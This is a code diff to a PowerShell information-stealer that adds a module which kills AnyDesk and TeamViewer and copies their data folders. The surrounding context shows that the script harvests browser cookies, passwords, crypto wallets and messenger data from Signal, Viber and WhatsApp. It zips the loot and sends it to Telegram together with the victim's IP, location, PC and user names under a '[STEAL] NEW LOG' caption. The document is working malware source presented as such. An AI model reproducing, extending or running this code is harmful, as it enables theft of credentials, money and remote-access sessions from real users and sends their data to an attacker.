@@ -32,9 +32,11 @@ $cookieCounter = 0
 $passwordCounter = 0
 $messagersCounter = 0
 $gamesCounter = 0
+
 $vpnCounter = $false
 $winscpCounter = $false
 $ftpCounter = $false
+$vncCounter = $false
 #--------------------
 function Send-TelegramMessage {
     param (
@@ -123,6 +125,7 @@ function Send-TelegramFile {
 	$svpnCounter = if ($global:vpnCounter) { $greenCheckMark } else { $redCrossMark }
 	$swinscpCounter = if ($global:winscpCounter) { $greenCheckMark } else { $redCrossMark }
 	$sftpCounter = if ($global:ftpCounter) { $greenCheckMark } else { $redCrossMark }	
+	$vncCounter = if ($global:vncCounter) { $greenCheckMark } else { $redCrossMark }	
 	
     Send-File -filePath "$ZIPfile" -passwords "$PasswdCount" -cookies "$CookieCount" -wallets "$MoneyCount" -bVPN "$svpnCounter" -bWinSCP "$swinscpCounter" -bFTP "$sftpCounter" -messagers "$messagersCount" -games "$gamesCount"
 }
@@ -136,7 +139,8 @@ function Send-File {
 		[string]$games,
         [string]$bVPN,
         [string]$bWinSCP,
-        [string]$bFTP
+        [string]$bFTP,
+		[string]$bVNC
     )
 
     $ErrorActionPreference= 'silentlycontinue'
@@ -167,7 +171,7 @@ function Send-File {
     $region = $ipInfo.region
     $country = $ipInfo.country
 
-    $caption = "$($redExclamation) Log [AIPS]`n$country, $city`nIP: $externalIP/$ipAddress `nOS: $osVersion`nPC Name: $computerName`nUser Name: $userName`n$($cookieSymbol) $cookies $($passwordSymbol) $passwords $($MoneySymbol) $wallets $($messageSymbol) $messagers $($joystickSymbol) $games`nDomain: $domain`nVPN: $bVPN`nFTP: $bFTP`nWinSCP: $bWinSCP"
+    $caption = "$($redExclamation) Log [AIPS]`n$country, $city`nIP: $externalIP/$ipAddress `nOS: $osVersion`nPC Name: $computerName`nUser Name: $userName`n$($cookieSymbol) $cookies $($passwordSymbol) $passwords $($MoneySymbol) $wallets $($messageSymbol) $messagers $($joystickSymbol) $games`nDomain: $domain`nVPN: $bVPN`nFTP: $bFTP`nWinSCP: $bWinSCP`nVNC: $bVNC"
 
     Add-Type -AssemblyName "System.Net.Http"
 
@@ -327,9 +331,10 @@ function Backup-Data {
     $important_files = "$folderformat\Important Files"
     $browser_data = "$folderformat\Browser Data"
     $ftp_clients = "$folderformat\FTP Clients"
+	$vnc_clients = "$folderformat\VNC Clients"
     $password_managers = "$folderformat\Password Managers" 
 
-    $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $ftp_clients, $password_managers)
+    $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $ftp_clients, $vnc_clients, $password_managers)
     foreach ($folder in $folders) { if (Test-Path $folder) { Remove-Item $folder -Recurse -Force } }
     $folders | ForEach-Object {
         New-Item -ItemType Directory -Path $_ -Force | Out-Null
@@ -585,7 +590,6 @@ function Backup-Data {
     } 
     signalstealer
 
-
     # Viber  
     function viberstealer {
         $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
@@ -610,7 +614,6 @@ function Backup-Data {
 		#--------------
     }
     viberstealer
-
 
     # Whatsapp  
     function whatsappstealer {
@@ -652,8 +655,7 @@ function Backup-Data {
 		#--------------
     }
     skype_stealer
-    
-    
+      
     # Pidgin 
     function pidgin_stealer {
         $pidgin_folder = "$env:userprofile\AppData\Roaming\.purple"
@@ -897,6 +899,64 @@ function Backup-Data {
     } 
     mailbird_backup
 
+	# VNC Clients
+	
+	# AnyDesk
+	function anydesk_backup {
+		$sourcePath = "$env:USERPROFILE\AppData\Roaming\AnyDesk"
+		$destinationPath = "$global:vnc_clients\AnyDesk"
+		if (-Not (Test-Path -Path $sourcePath)) {
+			Write-Output "[!] The source AnyDesk directory $sourcePath does not exist." -ForegroundColor Red
+			return
+		}
+		$anydeskProcess = Get-Process -Name "AnyDesk" -ErrorAction SilentlyContinue
+		if ($anydeskProcess) {
+			Write-Output "[!] AnyDesk is currently running. Stopping the process..." -ForegroundColor Red
+			Stop-Process -Name "AnyDesk" -Force
+			Start-Sleep -Seconds 5
+		}
+		if (-Not (Test-Path -Path $destinationPath)) {
+			New-Item -ItemType Directory -Path $destinationPath
+		}
+		Copy-Item -Path $sourcePath -Destination $destinationPath -Recurse -Force
+		Write-Output "[+] Successfully backed up AnyDesk directory: $latestDirPath" -ForegroundColor Green
+		$global:vncCounter = $true
+	}
+	anydesk_backup
+	
+	# TeamViewer
+	function teamviewer_backup {
+		$sourcePath = "$env:USERPROFILE\AppData\Local\TeamViewer\EdgeBrowserControl\Temporary"
+		$destinationPath = "$global:vnc_clients\TeamViewer"
+		$pathLogFile = "$destinationPath\backup_path.txt"
+		if (-Not (Test-Path -Path $sourcePath)) {
+			Write-Output "[!] The source TeamViewer directory does not exist." -ForegroundColor Red
+			return
+		}
+		$twProcess = Get-Process -Name "TeamViewer" -ErrorAction SilentlyContinue
+		if ($twProcess) {
+			Write-Output "[!] TeamViewer is currently running. Stopping the process..." -ForegroundColor Red
+			Stop-Process -Name "TeamViewer" -Force
+			Start-Sleep -Seconds 5
+		}
+		if (-Not (Test-Path -Path $destinationPath)) {
+			New-Item -ItemType Directory -Path $destinationPath
+		}
+		$latestDir = Get-ChildItem -Path $sourcePath | Where-Object { $_.PSIsContainer } | Sort-Object LastWriteTime -Descending | Select-Object -First 1
+		if ($latestDir) {
+			Copy-Item -Path $latestDir.FullName -Destination $destinationPath -Recurse -Force
+			$latestDirPath = $latestDir.FullName
+			$latestDirPath | Out-File -FilePath $pathLogFile -Encoding UTF8
+			Write-Output "[+] Successfully backed up the latest TeamViewer directory: $latestDirPath" -ForegroundColor Green
+			$global:vncCounter = $true
+		} else {
+			Write-Output "[!] No directories found in $sourcePath." -ForegroundColor Red
+		}
+	}
+	teamviewer_backup
+	
+	Write-Output "[*] VNC Clients backup success." -ForegroundColor Green
+	
     # FTP Clients 
 
     # Filezilla 
@@ -1335,8 +1395,9 @@ function Backup-Data {
 	$svpnCounter = if ($global:vpnCounter) { $greenCheckMark } else { $redCrossMark }
 	$swinscpCounter = if ($global:winscpCounter) { $greenCheckMark } else { $redCrossMark }
 	$sftpCounter = if ($global:ftpCounter) { $greenCheckMark } else { $redCrossMark }
+	$svncCounter = if ($global:vncCounter) { $greenCheckMark } else { $redCrossMark }
 	
-	$Omessage = "$($redExclamation) [STEAL] NEW LOG`n--------------`n$($cookieSymbol) $cookieCounter $($passwordSymbol) $passwordCounter $($MoneySymbol) $moneyCounter $($messageSymbol) $messagersCounter $($joystickSymbol) $gamesCounter`n--------------`nVPN: $svpnCounter`nFTP: $sftpCounter`nWinSCP: $swinscpCounter`n--------------"
+	$Omessage = "$($redExclamation) [STEAL] NEW LOG`n--------------`n$($cookieSymbol) $cookieCounter $($passwordSymbol) $passwordCounter $($MoneySymbol) $moneyCounter $($messageSymbol) $messagersCounter $($joystickSymbol) $gamesCounter`n--------------`nVPN: $svpnCounter`nFTP: $sftpCounter`nWinSCP: $swinscpCounter`nVNC: $svncCounter`n--------------"
 	Send-TelegramMessage -message $Omessage
 	#--------------------------------------
 	# cleanup
